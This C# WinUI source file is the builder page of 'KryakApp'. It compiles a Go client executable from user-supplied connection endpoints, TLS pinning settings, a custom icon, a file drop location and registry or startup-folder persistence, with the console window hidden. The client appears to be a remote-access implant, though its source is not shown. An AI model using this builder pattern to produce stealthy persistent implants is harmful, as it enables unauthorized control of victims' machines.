using KryakApp.Client;
using Microsoft.UI.Xaml;
using Microsoft.UI.Xaml.Controls;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using Microsoft.Windows.AppNotifications;
using Microsoft.Windows.AppNotifications.Builder;
using Windows.Storage;
using Windows.Storage.Pickers;
using WinRT.Interop;

namespace KryakApp.Pages
{
    public sealed partial class BuilderPage : Page
    {
        private readonly ObservableCollection<ConnectionEntry> _connections = [];
        private readonly List<string> _ipConnections = [];
        private readonly List<string> _rawConnections = [];

        public BuilderPage()
        {
            InitializeComponent();
            ConnectionListView.ItemsSource = _connections;
            UpdateConnectionCount();

            Loaded += BuilderPage_Loaded;
            Unloaded += BuilderPage_Unloaded;
        }

        private void BuilderPage_Loaded(object sender, RoutedEventArgs e)
        {
            App.Server.ServerStateChanged += Server_ServerStateChanged;
            UpdateTrustButtonState();
        }

        private void BuilderPage_Unloaded(object sender, RoutedEventArgs e)
        {
            App.Server.ServerStateChanged -= Server_ServerStateChanged;
        }

        private void Server_ServerStateChanged(bool isRunning)
        {
            if (!DispatcherQueue.HasThreadAccess)
            {
                DispatcherQueue.TryEnqueue(UpdateTrustButtonState);
                return;
            }

            UpdateTrustButtonState();
        }

        private void ConnectionModeRadio_Checked(object sender, RoutedEventArgs e)
        {
            if (IpPortInputPanel == null || RawInputPanel == null)
            {
                return;
            }

            bool rawMode = sender is RadioButton radio &&
                           string.Equals(radio.Name, nameof(RawModeRadio), StringComparison.Ordinal);

            IpPortInputPanel.Visibility = rawMode ? Visibility.Collapsed : Visibility.Visible;
            RawInputPanel.Visibility = rawMode ? Visibility.Visible : Visibility.Collapsed;
        }

        private void AddConnectionButton_Click(object sender, RoutedEventArgs e)
        {
            string? item = null;
            bool isRaw = RawModeRadio.IsChecked == true;

            if (isRaw)
            {
                string raw = RawUrlTextBox.Text.Trim();
                if (string.IsNullOrWhiteSpace(raw))
                {
                    return;
                }

                item = raw;
                RawUrlTextBox.Text = string.Empty;
            }
            else
            {
                string ip = IpTextBox.Text.Trim();
                string port = PortTextBox.Text.Trim();
                if (string.IsNullOrWhiteSpace(ip) || string.IsNullOrWhiteSpace(port))
                {
                    return;
                }

                item = $"{ip}:{port}";
                IpTextBox.Text = string.Empty;
                PortTextBox.Text = string.Empty;
            }

            foreach (ConnectionEntry existing in _connections)
            {
                if (existing.IsRaw == isRaw &&
                    string.Equals(existing.Value, item, StringComparison.OrdinalIgnoreCase))
                {
                    return;
                }
            }

            _connections.Add(new ConnectionEntry(item, isRaw));

            if (isRaw)
            {
                _rawConnections.Add(item);
            }
            else
            {
                _ipConnections.Add(item);
            }

            UpdateConnectionCount();
        }

        private void RemoveConnectionButton_Click(object sender, RoutedEventArgs e)
        {
            if (sender is not Button button || button.Tag is not ConnectionEntry entry)
            {
                return;
            }

            _connections.Remove(entry);

            if (entry.IsRaw)
            {
                _rawConnections.Remove(entry.Value);
            }
            else
            {
                _ipConnections.Remove(entry.Value);
            }

            UpdateConnectionCount();
        }

        private void CustomIconCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            IconPathTextBox.IsEnabled = true;
            BrowseIconButton.IsEnabled = true;
        }

        private void CustomIconCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            IconPathTextBox.IsEnabled = false;
            BrowseIconButton.IsEnabled = false;
        }

        private void DropCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            FileNameTextBox.IsEnabled = true;
            DropDirectoryTextBox.IsEnabled = true;
        }

        private void DropCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            FileNameTextBox.IsEnabled = false;
            DropDirectoryTextBox.IsEnabled = false;
        }

        private void StartupModeRadio_Checked(object sender, RoutedEventArgs e)
        {
            if (NoStartupRadio == null || RegistryStartupRadio == null || DropCheckBox == null)
            {
                return;
            }

            bool dropAllowed = NoStartupRadio.IsChecked == true || RegistryStartupRadio.IsChecked == true;
            DropCheckBox.IsEnabled = dropAllowed;

            if (!dropAllowed && DropCheckBox.IsChecked == true)
            {
                DropCheckBox.IsChecked = false;
            }
        }

        private void PinnedModeRadio_Checked(object sender, RoutedEventArgs e)
        {
            PinnedOptionsPanel.Visibility = Visibility.Visible;
            UpdateTrustButtonState();
        }

        private void PinnedModeRadio_Unchecked(object sender, RoutedEventArgs e)
        {
            PinnedOptionsPanel.Visibility = Visibility.Collapsed;
        }

        private void TrustCurrentCertificateButton_Click(object sender, RoutedEventArgs e)
        {
            if (!App.Server.IsRunning)
            {
                return;
            }

            FingerprintTextBox.Text = App.Server.CurrentCertificateFingerprint;
        }

        private async void BrowseIconButton_Click(object sender, RoutedEventArgs e)
        {
            if (App.MainWindow is null)
            {
                return;
            }

            FileOpenPicker picker = new();
            nint hwnd = WindowNative.GetWindowHandle(App.MainWindow);
            InitializeWithWindow.Initialize(picker, hwnd);
            picker.SuggestedStartLocation = PickerLocationId.ComputerFolder;
            picker.FileTypeFilter.Add(".ico");

            StorageFile? file = await picker.PickSingleFileAsync();
            if (file is null)
            {
                return;
            }

            IconPathTextBox.Text = file.Path;
        }

        private void UpdateConnectionCount()
        {
            ConnectionCountText.Text = _connections.Count == 0
                ? "No endpoints added"
                : $"Endpoints: {_connections.Count} (IP: {_ipConnections.Count}, Raw: {_rawConnections.Count})";
        }

        private void UpdateTrustButtonState()
        {
            TrustCurrentCertificateButton.IsEnabled = App.Server.IsRunning && PinnedModeRadio.IsChecked == true;
        }

        private async void BuildButton_Click(object sender, RoutedEventArgs e)
        {
            BuildButton.IsEnabled = false;
            try
            {
            bool? hasGo = null;

            try
            {
                System.Diagnostics.Process.Start("go", "version")?.Kill();
                hasGo = true;
            }
            catch
            {
                hasGo = File.Exists(Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe"));
            }
            if (hasGo == false)
            {
                ContentDialog dialog = new()
                {
                    Title = "Go Not Found",
                    Content = "Go compiler is required to build the client.\n\nYou can install Go manually or use the automatic installer.",
                    XamlRoot = XamlRoot,

                    PrimaryButtonText = "Install Automatically",
                    CloseButtonText = "Cancel",
                    DefaultButton = ContentDialogButton.Primary
                };

                ContentDialogResult result = await dialog.ShowAsync();
                if (result == ContentDialogResult.Primary)
                {
                    bool installed = await InstallGoWithProgressAsync();
                }
                return;
            }
            if (_connections.Count == 0)
            {
                ContentDialog dialog = new()
                {
                    Title = "No Endpoints",
                    Content = "Please add at least one connection endpoint before building the client.",
                    XamlRoot = XamlRoot,
                };
                dialog.PrimaryButtonText = "OK";
                _ = dialog.ShowAsync();
                return;
            }
            if (PinnedModeRadio.IsChecked == true && string.IsNullOrWhiteSpace(FingerprintTextBox.Text))
            {
                ContentDialog dialog = new()
                {
                    Title = "No Certificate Fingerprint",
                    Content = "Please trust the current server certificate or enter a fingerprint manually.",
                    XamlRoot = XamlRoot,
                };
                dialog.PrimaryButtonText = "OK";
                _ = dialog.ShowAsync();
                return;
            }
            if (CustomIconCheckBox.IsChecked == true && !File.Exists(IconPathTextBox.Text))
            {
                ContentDialog dialog = new()
                {
                    Title = "No Icon Path",
                    Content = "Please select an icon file or uncheck the custom icon option.",
                    XamlRoot = XamlRoot,
                };
                dialog.PrimaryButtonText = "OK";
                _ = dialog.ShowAsync();
                return;
            }
            if (DropCheckBox.IsChecked == true && (string.IsNullOrWhiteSpace(FileNameTextBox.Text) || string.IsNullOrWhiteSpace(DropDirectoryTextBox.Text)))
            {
                ContentDialog dialog = new()
                {
                    Title = "Invalid Drop Settings",
                    Content = "Please enter a valid file name and drop directory or uncheck the drop option.",
                    XamlRoot = XamlRoot,
                };
                dialog.PrimaryButtonText = "OK";
                _ = dialog.ShowAsync();
                return;
            }
            string goPath;
            if (File.Exists(Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe")))
            {
                goPath = Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe");
            }
            else
            {
                goPath = "go";
            }

            string[] ipList = _ipConnections.ToArray();
            string[] rawList = _rawConnections.ToArray();
            string clientTag = ClientTagTextBox.Text;
            string securityMode = InsecureModeRadio.IsChecked == true
                ? "insecure"
                : PinnedModeRadio.IsChecked == true ? "pinned" : "strict";
            string pinnedFingerprint = FingerprintTextBox.Text;
            int startupMode =
            NoStartupRadio.IsChecked == true ? 0 :
            FolderStartupRadio.IsChecked == true ? 1 :
            FolderAllUsersStartupRadio.IsChecked == true ? 2 : 3;
                if (App.MainWindow is null)
            {
                await ShowSimpleDialogAsync("Build Failed", "Main window is unavailable.");
                return;
            }

            FileSavePicker savePicker = new();
            nint hwnd = WindowNative.GetWindowHandle(App.MainWindow);
            InitializeWithWindow.Initialize(savePicker, hwnd);
            savePicker.SuggestedStartLocation = PickerLocationId.Downloads;
            savePicker.FileTypeChoices.Add("Executable file", [".exe"]);
            savePicker.SuggestedFileName = string.IsNullOrWhiteSpace(FileNameTextBox.Text)
                ? "client"
                : Path.GetFileNameWithoutExtension(FileNameTextBox.Text.Trim());

            StorageFile? outputFile = await savePicker.PickSaveFileAsync();
            if (outputFile is null)
            {
                return;
            }

            string tempBuildDir = Path.Combine(Path.GetTempPath(), "kryakclient-build");
            Directory.CreateDirectory(tempBuildDir);

             AppNotification buildNotification = new AppNotificationBuilder()
            .AddText("Build started")
            .AddText("Compiling client, please wait...")
            .BuildNotification();

             AppNotificationManager.Default.Show(buildNotification);

            string tempGoPath = Path.Combine(tempBuildDir, "main.go");
            string tempModPath = Path.Combine(tempBuildDir, "go.mod");
            string tempSumPath = Path.Combine(tempBuildDir, "go.sum");
            File.Delete(Path.Combine(tempBuildDir, "rsrc.syso"));
            File.WriteAllText(tempGoPath, ClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint, startupMode));
            File.WriteAllText(tempModPath, ClientSourceCode.GetModCode());
            File.WriteAllText(tempSumPath, ClientSourceCode.GetSumCode());

            if (CustomIconCheckBox.IsChecked == true)
            {
                if (!File.Exists(IconPathTextBox.Text.Trim()))
                {
                    await ShowSimpleDialogAsync("Build Failed", "Selected icon file does not exist.");
                    return;
                }
                ProcessStartInfo iconInfo = new()
                {
                    FileName = goPath.Replace("go.exe", "rsrc.exe"),
                    Arguments = $" -ico {IconPathTextBox.Text.Trim()} -o {Path.Combine(tempBuildDir, "rsrc.syso")}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    WorkingDirectory = tempBuildDir
                };
                using Process? processIcon = Process.Start(iconInfo);
                if (processIcon is null)
                {
                        await ShowSimpleDialogAsync("Build Failed", "Failed to start rsrc process.");
                        return;
                }

                string iconOut = await processIcon.StandardOutput.ReadToEndAsync();
                string iconErr = await processIcon.StandardError.ReadToEndAsync();
                await processIcon.WaitForExitAsync();

                if (processIcon.ExitCode != 0)
                {
                    await ShowSimpleDialogAsync("Build Failed", $"rsrc failed:\n{iconErr}\n{iconOut}");
                    return;
                }
            }
            ProcessStartInfo tidyInfo = new()
            {
                FileName = goPath,
                Arguments = "mod tidy",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                WorkingDirectory = tempBuildDir
            };

            using Process? tidyProcess = Process.Start(tidyInfo);
            await tidyProcess!.WaitForExitAsync();

            ProcessStartInfo startInfo = new()
            {
                FileName = goPath,
                Arguments = $"build -ldflags=\"-s -w -H windowsgui\" -trimpath -o \"{outputFile.Path}\" .",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                WorkingDirectory = tempBuildDir
            };

                using Process? process = Process.Start(startInfo);
            if (process is null)
            {
                await ShowSimpleDialogAsync("Build Failed", "Failed to start Go compiler process.");
                return;
            }

            string stdOut = await process.StandardOutput.ReadToEndAsync();
            string stdErr = await process.StandardError.ReadToEndAsync();
            await process.WaitForExitAsync();

            if (process.ExitCode != 0)
            {
                string details = string.IsNullOrWhiteSpace(stdErr) ? stdOut : stdErr;
                await ShowSimpleDialogAsync("Build Failed", $"go build returned code {process.ExitCode}.\n\n{details}");
                return;
            }

            await ShowSimpleDialogAsync("Build Completed", $"Client executable saved to:\n{outputFile.Path}");
            }
            finally
            {
                BuildButton.IsEnabled = true;
            }
        }

        private static string GetPackagedLocalPath()
        {
            return Path.Combine(ApplicationData.Current.LocalCacheFolder.Path, "Local", "KryakApp");
        }

        private async Task<bool> InstallGoWithProgressAsync()
        {
            TextBlock statusText = new()
            {
                Text = "Downloading Go compiler...",
                TextWrapping = TextWrapping.WrapWholeWords
            };

            ProgressBar progressBar = new()
            {
                IsIndeterminate = true,
                Height = 6
            };

            ContentDialog progressDialog = new()
            {
                Title = "Installing Go",
                XamlRoot = XamlRoot,
                IsPrimaryButtonEnabled = false,
                IsSecondaryButtonEnabled = false,
                CloseButtonText = string.Empty,
                Content = new StackPanel
                {
                    Spacing = 12,
                    Children =
                    {
                        statusText,
                        progressBar
                    }
                }
            };

            _ = progressDialog.ShowAsync();
            await Task.Delay(50);

            string tempPath = Path.Combine(Path.GetTempPath(), "go1.26.3.windows-amd64.zip");
            string extractPath = GetPackagedLocalPath();

            try
            {
                using System.Net.Http.HttpClient client = new();
                byte[] data = await client.GetByteArrayAsync("https://go.dev/dl/go1.26.3.windows-amd64.zip");
                await File.WriteAllBytesAsync(tempPath, data);

                statusText.Text = "Extracting files...";

                if (Directory.Exists(extractPath))
                {
                    Directory.Delete(extractPath, recursive: true);
                }

                Directory.CreateDirectory(extractPath);
                System.IO.Compression.ZipFile.ExtractToDirectory(tempPath, extractPath);
                File.Delete(tempPath);
                string rsrcUrl = "https://github.com/akavel/rsrc/releases/download/v0.10.2/rsrc_windows_amd64.exe";
                byte[] rsrcData = await client.GetByteArrayAsync(rsrcUrl);
                string rsrcPath = Path.Combine(extractPath, "go", "bin", "rsrc.exe");
                await File.WriteAllBytesAsync(rsrcPath, rsrcData);
                return true;
            }
            catch
            {
                await ShowSimpleDialogAsync(
                    "Installation Failed",
                    "Failed to install Go compiler automatically. Please check internet connection and disk access, then try again.");
                return false;
            }
            finally
            {
                progressDialog.Hide();
            }
        }

        private async Task ShowSimpleDialogAsync(string title, string content)
        {
            ContentDialog dialog = new()
            {
                Title = title,
                Content = content,
                XamlRoot = XamlRoot,
                PrimaryButtonText = "OK"
            };

            await dialog.ShowAsync();
        }

        private sealed class ConnectionEntry
        {
            public ConnectionEntry(string value, bool isRaw)
            {
                Value = value;
                IsRaw = isRaw;
            }

            public string Value { get; }
            public bool IsRaw { get; }
            public string DisplayText => Value;
        }
    }
}
